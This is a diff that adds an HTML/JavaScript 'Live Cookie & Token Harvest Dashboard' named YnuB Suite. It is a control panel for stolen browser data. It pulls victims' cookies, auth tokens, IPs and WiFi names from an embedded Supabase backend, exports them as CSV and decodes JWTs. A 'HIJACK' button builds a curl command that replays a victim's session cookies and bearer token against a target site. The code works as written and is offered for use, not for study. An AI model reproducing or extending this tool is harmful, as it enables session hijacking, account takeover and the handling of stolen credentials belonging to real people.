@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YnuB Suite | Live Cookie Harvest</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            overflow: hidden
+        }
+
+        .header {
+            background: linear-gradient(135deg, #ff6b6b, #feca57);
+            color: white;
+            padding: 30px;
+            text-align: center
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px
+        }
+
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 20px;
+            flex-wrap: wrap
+        }
+
+        .stat {
+            background: rgba(255, 255, 255, 0.3);
+            padding: 15px 25px;
+            border-radius: 10px;
+            min-width: 120px;
+            text-align: center
+        }
+
+        .stat-value {
+            font-size: 2em;
+            font-weight: bold;
+            color: #fff
+        }
+
+        .stat-label {
+            font-size: 0.9em;
+            opacity: 0.9
+        }
+
+        .controls {
+            padding: 20px;
+            background: #f8f9fa;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            align-items: center
+        }
+
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            font-size: 14px
+        }
+
+        .btn-primary {
+            background: #007bff;
+            color: white
+        }
+
+        .btn-danger {
+            background: #dc3545;
+            color: white
+        }
+
+        .btn-success {
+            background: #28a745;
+            color: white
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2)
+        }
+
+        .filter-input {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            width: 250px
+        }
+
+        .table-container {
+            max-height: 600px;
+            overflow: auto
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse
+        }
+
+        th {
+            background: #343a40;
+            color: white;
+            padding: 15px;
+            font-weight: 600;
+            text-align: left;
+            position: sticky;
+            top: 0
+        }
+
+        td {
+            padding: 12px;
+            border-bottom: 1px solid #eee;
+            vertical-align: top
+        }
+
+        .token {
+            background: #ffebef !important;
+            padding: 8px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            cursor: pointer;
+            white-space: nowrap;
+            max-width: 300px;
+            overflow: hidden;
+            text-overflow: ellipsis
+        }
+
+        .token:hover {
+            background: #ffe0e6 !important
+        }
+
+        .ip {
+            background: #e3f2fd;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 11px
+        }
+
+        .wifi {
+            background: #f3e5f5;
+            padding: 4px 8px;
+            border-radius: 4px
+        }
+
+        .hit {
+            animation: pulse 1s infinite
+        }
+
+        .steal-btn {
+            background: #28a745 !important;
+            color: white !important;
+            padding: 8px 16px !important;
+            border-radius: 5px !important;
+            font-size: 12px !important
+        }
+
+        .steal-btn:hover {
+            background: #218838 !important
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                box-shadow: 0 0 0 0 rgba(40, 167, 69, 0.7)
+            }
+
+            50% {
+                box-shadow: 0 0 0 10px rgba(40, 167, 69, 0)
+            }
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px;
+            color: #666
+        }
+
+        .jwt-decoder {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            display: none;
+            z-index: 1000
+        }
+
+        .close {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            cursor: pointer;
+            font-size: 20px;
+            color: #999
+        }
+
+        @media(max-width:768px) {
+            .stats {
+                gap: 10px
+            }
+
+            .stat {
+                min-width: 80px
+            }
+
+            .controls {
+                flex-direction: column
+            }
+
+            .stat-value {
+                font-size: 1.5em
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-cookie-bite"></i> YnuB Suite</h1>
+            <p>Live Cookie & Token Harvest Dashboard</p>
+            <div class="stats">
+                <div class="stat">
+                    <div class="stat-value" id="live-count">0</div>
+                    <div class="stat-label">Live Hits</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value" id="unique-ips">0</div>
+                    <div class="stat-label">Unique IPs</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value" id="tokens">0</div>
+                    <div class="stat-label">Tokens</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="controls">
+            <input type="text" class="filter-input" id="filter" placeholder="🔍 Filter cookies/tokens...">
+            <button class="btn btn-primary" onclick="clearFilter()"><i class="fas fa-times"></i> Clear</button>
+            <button class="btn btn-success" onclick="exportAll()"><i class="fas fa-download"></i> Export All</button>
+            <button class="btn btn-danger" onclick="clearTable()"><i class="fas fa-trash"></i> Clear DB</button>
+            <span style="margin-left:auto;font-size:12px;color:#666">Auto-refresh: 2s</span>
+        </div>
+
+        <div class="table-container">
+            <table id="harvest-table">
+                <thead>
+                    <tr>
+                        <th><i class="fas fa-clock"></i> Time</th>
+                        <th><i class="fas fa-globe"></i> IP</th>
+                        <th><i class="fas fa-wifi"></i> WiFi</th>
+                        <th><i class="fas fa-user"></i> UA</th>
+                        <th><i class="fas fa-cookie"></i> Cookies</th>
+                        <th><i class="fas fa-key"></i> Tokens</th>
+                        <th><i class="fas fa-rocket"></i> Action</th>
+                    </tr>
+                </thead>
+                <tbody id="table-body"></tbody>
+            </table>
+            <div class="empty-state" id="empty-state">
+                <i class="fas fa-cookie-bite" style="font-size:4em;color:#ccc;margin-bottom:20px"></i>
+                <h3>No cookies yet...</h3>
+                <p>Run your harvesters and watch the magic!</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="jwt-decoder" id="decoder">
+        <span class="close" onclick="closeDecoder()">&times;</span>
+        <h3><i class="fas fa-eye"></i> Decoded Token</h3>
+        <pre id="decoded-content"></pre>
+    </div>
+
+    <script>
+        const SUPABASE_URL = 'https://bljzczucifemikxrvkkm.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJsanpjenVjaWZlbWlreHJ2a2ttIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MjIxODAsImV4cCI6MjA4OTQ5ODE4MH0.R_sPF74xdjLz-n13WUlqZbqDbKY03Yveegea_MzZHT4';
+        const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        let allData = [], filterText = '';
+
+        async function loadData() {
+            const { data, error } = await supabase
+                .from('cookies')
+                .select('*')
+                .order('timestamp', { ascending: false })
+                .limit(100);
+
+            if (data) {
+                allData = data;
+                updateStats(data);
+                renderTable(data);
+            }
+        }
+
+        function updateStats(data) {
+            document.getElementById('live-count').textContent = data.length;
+            document.getElementById('unique-ips').textContent = new Set(data.map(d => d.src_ip)).size;
+            document.getElementById('tokens').textContent = data.filter(d => d.tokens).length;
+        }
+
+        function renderTable(data) {
+            const tbody = document.getElementById('table-body');
+            const filtered = data.filter(row =>
+                JSON.stringify(row).toLowerCase().includes(filterText.toLowerCase())
+            );
+
+            if (filtered.length === 0) {
+                document.getElementById('empty-state').style.display = 'block';
+                tbody.innerHTML = '';
+                return;
+            }
+
+            document.getElementById('empty-state').style.display = 'none';
+
+            tbody.innerHTML = filtered.map((row, i) => `
+                <tr class="${i < 5 ? 'hit' : ''}">
+                    <td>${new Date(row.timestamp * 1000).toLocaleString()}</td>
+                    <td><span class="ip">${row.src_ip}</span></td>
+                    <td><span class="wifi">${row.wifi || 'Unknown'}</span></td>
+                    <td>${row.ua ? row.ua.substring(0, 40) + '...' : '-'}</td>
+                    <td><span class="token" onclick="copyText('${row.cookies}')">${row.cookies ? row.cookies.substring(0, 60) + '...' : '-'}</span></td>
+                    <td><span class="token" onclick="decodeJWT('${row.tokens}')">${row.tokens ? row.tokens.substring(0, 60) + '...' : '-'}</span></td>
+                    <td><button class="steal-btn" onclick="stealSession('${row.cookies || ''}', '${row.tokens || ''}', '${row.src_ip}')">
+                        <i class="fas fa-rocket"></i> HIJACK
+                    </button></td>
+                </tr>
+            `).join('');
+        }
+
+        function stealSession(cookies, token, ip) {
+            const curl = `curl -b "${cookies}" ${token ? `-H "Authorization: Bearer ${token}"` : ''} -X GET https://target.com/profile -v`;
+            navigator.clipboard.writeText(curl);
+            alert(`🚀 HIJACK CMD COPIED!\n\n${curl.substring(0, 100)}...\n\nTarget IP: ${ip}`);
+        }
+
+        function decodeJWT(token) {
+            try {
+                const payload = JSON.parse(atob(token.split('.')[1]));
+                document.getElementById('decoded-content').textContent = JSON.stringify(payload, null, 2);
+                document.getElementById('decoder').style.display = 'block';
+            } catch (e) {
+                alert('Invalid JWT');
+            }
+        }
+
+        function copyText(text) {
+            navigator.clipboard.writeText(text);
+            event.target.style.background = '#d4edda';
+            setTimeout(() => event.target.style.background = '', 1000);
+        }
+
+        function closeDecoder() {
+            document.getElementById('decoder').style.display = 'none';
+        }
+
+        document.getElementById('filter').addEventListener('input', (e) => {
+            filterText = e.target.value;
+            renderTable(allData);
+        });
+
+        window.clearFilter = () => {
+            document.getElementById('filter').value = '';
+            filterText = '';
+            renderTable(allData);
+        };
+
+        window.exportAll = async () => {
+            const { data } = await supabase.from('cookies').select('*');
+            const csv = 'Time,IP,WiFi,UA,Cookies,Tokens\n' + data.map(r =>
+                `"${new Date(r.timestamp * 1000)}","${r.src_ip}","${r.wifi}","${r.ua}","${r.cookies}","${r.tokens}"`
+            ).join('\n');
+            const a = document.createElement('a');
+            a.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv);
+            a.download = 'ynub-harvest.csv';
+            a.click();
+        };
+
+        window.clearTable = async () => {
+            if (confirm('Delete ALL harvested data?')) {
+                await supabase.from('cookies').delete().neq('id', 0);
+                loadData();
+            }
+        };
+
+        // Auto-refresh every 2 seconds
+        setInterval(loadData, 2000);
+        loadData();
+
+        // Click outside to close decoder
+        document.addEventListener('click', (e) => {
+            if (!document.getElementById('decoder').contains(e.target)) {
+                closeDecoder();
+            }
+        });
+    </script>
+</body>
+
+</html>
